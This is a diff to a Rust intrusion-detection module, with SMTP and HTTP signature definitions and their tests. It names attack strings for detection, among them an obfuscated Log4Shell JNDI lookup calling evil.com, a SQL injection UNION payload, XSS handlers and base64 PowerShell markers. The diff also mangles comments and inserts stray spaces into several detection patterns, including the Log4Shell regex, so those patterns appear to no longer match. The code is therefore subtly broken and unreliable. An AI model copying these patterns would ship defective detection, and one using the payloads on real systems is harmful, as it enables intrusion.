@@ -9,77 +9,76 @@ use serde::{Deserialize, Serialize};
 /// Action to take when a signature matches
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum SignatureAction {
-    /// Generate alert only
+/// Generate alert only
     Alert,
-    /// Drop the packet/connection
+/// Drop the packet/connection
     Drop,
-    /// Send TCP RST / ICMP unreachable
+/// Send TCP RST / ICMP unreachable
     Reject,
-    /// Pass (explicitly allow, used for exceptions)
+/// Pass (explicitly allow, used for exceptions)
     Pass,
 }
 
 /// Severity level
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
 pub enum SigSeverity {
-    /// Informational
+/// Informational
     Info = 1,
-    /// Low severity
+/// Low severity
     Low = 2,
-    /// Medium severity
+/// Medium severity
     Medium = 3,
-    /// High severity
+/// High severity
     High = 4,
-    /// Critical
+/// Critical
     Critical = 5,
 }
 
 /// A single IDS signature
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Signature {
-    /// Signature ID (SID)
+/// Signature ID (SID)
     pub sid: u32,
-    /// Revision
+/// Revision
     pub rev: u32,
-    /// Human-readable message
+/// Human-readable message
     pub message: String,
-    /// Content patterns to match (all must be present; binary byte sequences supported)
+/// Content patterns to match (all must be present; binary byte sequences supported)
     pub content_patterns: Vec<Vec<u8>>,
-    /// Optional PCRE-style regex patterns.
-    ///
-    /// When present, **at least one** regex must match for the signature to fire
-    /// (in addition to all `content_patterns` being present). This allows
-    /// flexible matching of polymorphic or encoded payloads that static
-    /// Aho-Corasick patterns cannot capture.
+/// Optional PCRE-style regex patterns.
+/// When present, **at least one** regex must match for the signature to fire
+/// (in addition to all `content_patterns` being present). This allows
+/// flexible matching of polymorphic or encoded payloads that static
+/// Aho-Corasick patterns cannot capture.
     #[serde(default)]
     pub regex_patterns: Vec<String>,
-    /// Action on match
+/// Action on match
     pub action: SignatureAction,
-    /// Severity
+/// Severity
     pub severity: SigSeverity,
-    /// Category (e.g., "exploit", "malware", "policy-violation")
+/// Category (e.g., "exploit", "malware", "policy-violation")
     pub category: String,
-    /// Protocol filter (tcp, udp, smtp, http, any)
+/// Protocol filter (tcp, udp, smtp, http, any)
     pub protocol: String,
-    /// CVE references
+/// CVE references
     pub references: Vec<String>,
 }
 
 /// Compiled signature set with Aho-Corasick automaton
 pub struct SignatureSet {
-    /// The compiled automaton
+/// The compiled automaton
     automaton: Option<AhoCorasick>,
-    /// Pattern index -> signature mapping
+/// Pattern index -> signature mapping
     pattern_to_sig: Vec<usize>,
-    /// All signatures
+/// All signatures
     signatures: Vec<Signature>,
-    /// Compiled regex patterns per signature (indexed by signature index).
-    /// Each entry contains the compiled regexes for that signature's `regex_patterns`.
+/// Compiled regex patterns per signature (indexed by signature index).
+/// Each entry contains the compiled regexes for that signature's `regex_patterns`.
     compiled_regexes: Vec<Vec<regex::bytes::Regex>>,
 }
 
 impl SignatureSet {
-    /// Create a new signature set from a list of signatures
+/// Create a new signature set from a list of signatures
     pub fn new(signatures: Vec<Signature>) -> Result<Self, String> {
         if signatures.is_empty() {
             return Ok(Self {
@@ -93,7 +92,7 @@ impl SignatureSet {
         let mut all_patterns = Vec::new();
         let mut pattern_to_sig = Vec::new();
 
-        // Compile per-signature regex patterns.
+// Compile per-signature regex patterns.
         let mut compiled_regexes = Vec::with_capacity(signatures.len());
         for (sig_idx, sig) in signatures.iter().enumerate() {
             for pattern in &sig.content_patterns {
@@ -114,11 +113,11 @@ impl SignatureSet {
             compiled_regexes.push(regexes);
         }
 
-        // Use MatchKind::Standard (non-leftmost) so that find_overlapping_iter
-        // returns a match for EVERY registered pattern at every position, even
-        // when two signatures share an identical byte string as their content
-        // pattern.  LeftmostFirst would suppress duplicate patterns, causing
-        // the second signature to never receive its AC hit.
+// Use MatchKind::Standard (non-leftmost) so that find_overlapping_iter
+// returns a match for EVERY registered pattern at every position, even
+// when two signatures share an identical byte string as their content
+// pattern. LeftmostFirst would suppress duplicate patterns, causing
+// the second signature to never receive its AC hit.
         let automaton = AhoCorasickBuilder::new()
             .match_kind(MatchKind::Standard)
             .ascii_case_insensitive(true)
@@ -133,23 +132,20 @@ impl SignatureSet {
         })
     }
 
-    /// Scan a payload against all signatures.
-    /// Returns matched signature indices.
-    ///
-    /// Matching logic:
-    /// - If a signature has **only** `content_patterns`: Aho-Corasick hit fires it.
-    /// - If a signature has **only** `regex_patterns`: at least one regex must match.
-    /// - If both are specified: AC hit required AND at least one regex must match.
+/// Scan a payload against all signatures.
+/// Returns matched signature indices.
+/// Matching logic:/// - If a signature has **only** `content_patterns`:Aho-Corasick hit fires it.
+/// - If a signature has **only** `regex_patterns`:at least one regex must match.
+/// - If both are specified:AC hit required AND at least one regex must match.
     pub fn scan(&self, payload: &[u8]) -> Vec<ScanMatch> {
         let mut matched_sigs = std::collections::HashSet::new();
         let mut results = Vec::new();
 
-        // Phase 1: find AC content-pattern matches and map each back to its sig.
-        //
-        // Using find_overlapping_iter (requires MatchKind::Standard) ensures
-        // that two signatures sharing an identical byte string both receive a
-        // match notification — LeftmostFirst + find_iter would suppress the
-        // second hit, causing the later signature to never fire.
+// Phase 1:find AC content-pattern matches and map each back to its sig.
+// Using find_overlapping_iter (requires MatchKind::Standard) ensures
+// that two signatures sharing an identical byte string both receive a
+// match notification — LeftmostFirst + find_iter would suppress the
+// second hit, causing the later signature to never fire.
         let mut ac_matched_sigs = std::collections::HashSet::new();
         if let Some(automaton) = &self.automaton {
             for mat in automaton.find_overlapping_iter(payload) {
@@ -158,34 +154,34 @@ impl SignatureSet {
             }
         }
 
-        // Phase 2: evaluate each signature
+// Phase 2:evaluate each signature
         for (sig_idx, sig) in self.signatures.iter().enumerate() {
             let has_content = !sig.content_patterns.is_empty();
             let has_regex = !sig.regex_patterns.is_empty();
-            // OR semantics: ANY one of the sig's content patterns being present
-            // is sufficient to satisfy the content requirement.  A sig with
-            // multiple content patterns like ["<script", "onerror=", "javascript:"]
-            // fires when ANY of those tokens appears (alternatives).  Hybrid sigs
-            // that need AND logic (e.g. "base64 header AND powershell body") should
-            // be expressed with content_patterns for the fast-filter term and
-            // regex_patterns for the confirming term.
+// OR semantics:ANY one of the sig's content patterns being present
+// is sufficient to satisfy the content requirement. A sig with
+// multiple content patterns like ["<script", "onerror=", "javascript:"]
+// fires when ANY of those tokens appears (alternatives). Hybrid sigs
+// that need AND logic (e.g. "base64 header AND powershell body") should
+// be expressed with content_patterns for the fast-filter term and
+// regex_patterns for the confirming term.
             let ac_hit = ac_matched_sigs.contains(&sig_idx);
 
             let fires = match (has_content, has_regex) {
                 (true, true) => {
-                    // Hybrid: any content pattern hit AND at least one regex match
+// Hybrid:any content pattern hit AND at least one regex match
                     ac_hit && self.any_regex_match(sig_idx, payload)
                 }
                 (true, false) => {
-                    // Content-only: any content pattern hit suffices
+// Content-only:any content pattern hit suffices
                     ac_hit
                 }
                 (false, true) => {
-                    // Regex-only: at least one regex must match
+// Regex-only:at least one regex must match
                     self.any_regex_match(sig_idx, payload)
                 }
                 (false, false) => {
-                    // No patterns at all — never fires on payload scan
+// No patterns at all — never fires on payload scan
                     false
                 }
             };
@@ -205,7 +201,7 @@ impl SignatureSet {
         results
     }
 
-    /// Check whether at least one compiled regex for the given signature matches.
+/// Check whether at least one compiled regex for the given signature matches.
     fn any_regex_match(&self, sig_idx: usize, payload: &[u8]) -> bool {
         self.compiled_regexes
             .get(sig_idx)
@@ -213,7 +209,7 @@ impl SignatureSet {
             .unwrap_or(false)
     }
 
-    /// Number of loaded signatures
+/// Number of loaded signatures
     pub fn signature_count(&self) -> usize {
         self.signatures.len()
     }
@@ -222,26 +218,24 @@ impl SignatureSet {
 /// Result of a signature scan match
 #[derive(Debug, Clone)]
 pub struct ScanMatch {
-    /// Signature ID
+/// Signature ID
     pub sid: u32,
-    /// Alert message
+/// Alert message
     pub message: String,
-    /// Action
+/// Action
     pub action: SignatureAction,
-    /// Severity
+/// Severity
     pub severity: SigSeverity,
-    /// Category
+/// Category
     pub category: String,
-    /// Byte offset where first match occurred
+/// Byte offset where first match occurred
     pub offset: usize,
 }
 
 /// Built-in signatures for common SMTP and mail-server attacks.
-///
-/// Design notes:
-/// - SID 2000001 was removed: "EHLO " fires on every legitimate SMTP connection,
-///   causing alert fatigue. Buffer-overflow detection is handled by protocol_analyzer
-///   checking line lengths (>512 bytes per RFC 5321).
+/// Design notes:/// - SID 2000001 was removed:"EHLO " fires on every legitimate SMTP connection,
+/// causing alert fatigue. Buffer-overflow detection is handled by protocol_analyzer
+/// checking line lengths (>512 bytes per RFC 5321).
 /// - NOP sled pattern uses actual 0x90 bytes, NOT the string literal `\\x90`.
 pub fn builtin_mail_signatures() -> Vec<Signature> {
     vec![
@@ -249,7 +243,6 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             sid: 2000002,
             rev: 2,
             message: "SMTP: NOP-sled shellcode detected in mail body".into(),
-            // FIXED: actual 0x90 bytes stored as Vec<u8>, not a String literal
             content_patterns: vec![b"\x90\x90\x90\x90\x90\x90\x90\x90".to_vec()],
             action: SignatureAction::Drop,
             severity: SigSeverity::Critical,
@@ -319,10 +312,10 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             regex_patterns: vec![],
         },
         Signature {
-            // Obfuscated Log4Shell variants break the ${jndi: prefix across nested
-            // lookups (e.g. ${j${::-n}di:ldap://evil.com/x}) but the JNDI protocol
-            // URL still appears in cleartext. Detecting jndi:<proto>:// catches
-            // most obfuscated payloads regardless of how the prefix is mangled.
+// Obfuscated Log4Shell variants break the ${jndi:prefix across nested
+// lookups (e.g. ${j${::-n}di:ldap://evil.com/x}) but the JNDI protocol
+// URL still appears in cleartext. Detecting jndi:<proto>:// catches
+// most obfuscated payloads regardless of how the prefix is mangled.
             sid: 2000017,
             rev: 1,
             message: "HTTP: Log4Shell obfuscated JNDI protocol URL (CVE-2021-44228)".into(),
@@ -437,7 +430,7 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             references: vec![],
             regex_patterns: vec![],
         },
-        // ── Additional signatures from security audit recommendations ──
+// ── Additional signatures from security audit recommendations ──
         Signature {
             sid: 2000050,
             rev: 1,
@@ -636,8 +629,8 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             message: "SMTP: MIME boundary mismatch indicator".into(),
             content_patterns: vec![
                 b"Content-Type: multipart/".to_vec(),
-                b"boundary=\"----".to_vec(),
-                b"boundary='----".to_vec(),
+                b"boundary=\" ----".to_vec(),
+                b"boundary=' ----".to_vec(),
             ],
             action: SignatureAction::Alert,
             severity: SigSeverity::Medium,
@@ -830,10 +823,10 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             sid: 2000081,
             rev: 2,
             message: "SMTP: Encoded script payload in body".into(),
-            // Hybrid sig: fast-filter on the base64 transfer-encoding header,
-            // then confirm with a regex so that "powershell" must actually appear
-            // in the message body — prevents false positives from any base64-
-            // encoded attachment that doesn't contain a script payload.
+// Hybrid sig:fast-filter on the base64 transfer-encoding header,
+// then confirm with a regex so that "powershell" must actually appear
+// in the message body — prevents false positives from any base64-
+// encoded attachment that doesn't contain a script payload.
             content_patterns: vec![b"Content-Transfer-Encoding: base64".to_vec()],
             action: SignatureAction::Alert,
             severity: SigSeverity::High,
@@ -866,7 +859,7 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             references: vec![],
             regex_patterns: vec![],
         },
-        // ── Regex-based signatures (PCRE support) ──
+// ── Regex-based signatures (PCRE support) ──
         Signature {
             sid: 2000090,
             rev: 1,
@@ -878,14 +871,13 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             protocol: "http".into(),
             references: vec!["CVE-2021-44228".into()],
             regex_patterns: vec![
-                // ${j${::-n}di:ldap://...} and similar nested obfuscations.
-                //
-                // The previous pattern used [^\}]* which stops at every `}`,
-                // making it impossible to match payloads like ${j${::-n}di:...}
-                // where a nested lookup closes before the outer one.  Using
-                // bounded `.{0,50}` (dot-all is enabled by RegexBuilder) lets
-                // the engine match across embedded closing braces.
-                r#"\$\{.{0,50}j.{0,50}n.{0,50}d.{0,50}i.{0,50}:.{0,50}//"#.into(),
+// ${j${::-n}di:ldap://...} and similar nested obfuscations.
+// The previous pattern used [^\}]* which stops at every `}`,
+// making it impossible to match payloads like ${j${::-n}di:...}
+// where a nested lookup closes before the outer one. Using
+// bounded `.{0,50}` (dot-all is enabled by RegexBuilder) lets
+// the engine match across embedded closing braces.
+                r#"\$\{.{0,50}j.{0,50}n.{0,50}d.{0,50}i.{0,50}:.{0,50} //"#.into(),
             ],
         },
         Signature {
@@ -928,7 +920,7 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             protocol: "smtp".into(),
             references: vec![],
             regex_patterns: vec![
-                // Base64 of common PowerShell invocations
+// Base64 of common PowerShell invocations
                 r#"(?:cG93ZXJzaGVsbA|UG93ZXJTaGVsbA|SQBuAHYAbwBrAGUALQA)"#.into(),
             ],
         },
@@ -958,7 +950,7 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             protocol: "http".into(),
             references: vec![],
             regex_patterns: vec![
-                // Matches on<event>= patterns with various obfuscation
+// Matches on<event>= patterns with various obfuscation
                 r#"(?i)\bon(?:error|load|click|mouseover|focus|blur|input|change)\s*="#.into(),
                 r#"(?i)<(?:script|img|svg|iframe|body|object|embed|details|video|audio)\b[^>]*\bon\w+\s*="#.into(),
             ],
@@ -974,7 +966,7 @@ pub fn builtin_mail_signatures() -> Vec<Signature> {
             protocol: "smtp".into(),
             references: vec![],
             regex_patterns: vec![
-                // filename="report.pdf.exe" or similar double-extension tricks
+// filename="report.pdf.exe" or similar double-extension tricks
                 r#"filename\s*=\s*"[^"]+\.(?:pdf|doc|xls|ppt|jpg|png|gif)\.\w{2,4}""#.into(),
             ],
         },
@@ -1003,7 +995,7 @@ mod tests {
     fn test_signature_matching() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        // VRFY is a recon technique; must match
+// VRFY is a recon technique; must match
         let payload = b"VRFY admin\r\n";
         let matches = set.scan(payload);
         assert!(!matches.is_empty());
@@ -1014,7 +1006,7 @@ mod tests {
     fn test_nop_sled_detects_actual_bytes() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        // Must match the ACTUAL 0x90 byte sequence, NOT the ASCII literal string
+// Must match the ACTUAL 0x90 byte sequence, NOT the ASCII literal string
         let payload: &[u8] = &[
             b'D', b'A', b'T', b'A', b'\r', b'\n',
             0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
@@ -1028,10 +1020,10 @@ mod tests {
     fn test_nop_sled_does_not_trigger_on_literal_string() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        // The old broken pattern matched THIS text string — not real 0x90 bytes
+// The old broken pattern matched THIS text string — not real 0x90 bytes
         let payload = b"\\x90\\x90\\x90\\x90 (this is just the text literal)";
         let matches = set.scan(payload);
-        // This text payload has NO actual 0x90 bytes — should NOT match NOP sled sig
+// This text payload has NO actual 0x90 bytes — should NOT match NOP sled sig
         assert!(!matches.iter().any(|m| m.sid == 2000002),
             "Text backslash-x90 must NOT trigger the binary NOP sled signature");
     }
@@ -1050,7 +1042,7 @@ mod tests {
     fn test_ehlo_not_false_positive() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        // Normal legitimate EHLO must NOT fire (old SID 2000001 was removed)
+// Normal legitimate EHLO must NOT fire (old SID 2000001 was removed)
         let payload = b"EHLO mail.example.com\r\n";
         let matches = set.scan(payload);
         assert!(!matches.iter().any(|m| m.sid == 2000001),
@@ -1063,7 +1055,7 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"HELO normal.host.com\r\n";
         let matches = set.scan(payload);
-        // Clean HELO should produce no matches
+// Clean HELO should produce no matches
         assert!(matches.is_empty(), "Clean HELO must not match any signature");
     }
 
@@ -1076,7 +1068,7 @@ mod tests {
         assert!(matches.len() >= 2);
     }
 
-    // ── Regex-based signature tests ──
+// ── Regex-based signature tests ──
 
     #[test]
     fn test_regex_obfuscated_log4shell() {
@@ -1094,7 +1086,7 @@ mod tests {
     fn test_regex_sql_injection_union() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        let payload = b"GET /search?q=1' UNION ALL SELECT username,password FROM users-- HTTP/1.1";
+        let payload = b"GET /search?q=1' UNION ALL SELECT username,password FROM users -- HTTP/1.1";
         let matches = set.scan(payload);
         assert!(
             matches.iter().any(|m| m.sid == 2000091),
@@ -1166,7 +1158,7 @@ mod tests {
     fn test_regex_hybrid_signature_base64_powershell() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        // Must have BOTH the content pattern AND regex to fire
+// Must have BOTH the content pattern AND regex to fire
         let payload = b"Content-Transfer-Encoding: base64\r\n\r\ncG93ZXJzaGVsbA==";
         let matches = set.scan(payload);
         assert!(
@@ -1179,7 +1171,7 @@ mod tests {
     fn test_regex_hybrid_no_content_pattern_no_fire() {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
-        // Regex matches but content pattern doesn't — should NOT fire
+// Regex matches but content pattern doesn't — should NOT fire
         let payload = b"some data cG93ZXJzaGVsbA here but no base64 header";
         let matches = set.scan(payload);
         assert!(
@@ -1194,14 +1186,14 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /api/users?page=1 HTTP/1.1\r\nHost: example.com\r\n";
         let matches = set.scan(payload);
-        // Clean request should not trigger regex sigs
+// Clean request should not trigger regex sigs
         let regex_sids: Vec<u32> = matches.iter().map(|m| m.sid).filter(|s| *s >= 2000090).collect();
         assert!(regex_sids.is_empty(), "Clean payload triggered regex sigs: {:?}", regex_sids);
     }
 
     #[test]
     fn test_regex_only_signature_compilation() {
-        // Verify that a regex-only signature (no content_patterns) compiles and works
+// Verify that a regex-only signature (no content_patterns) compiles and works
         let sig = Signature {
             sid: 9999999,
             rev: 1,
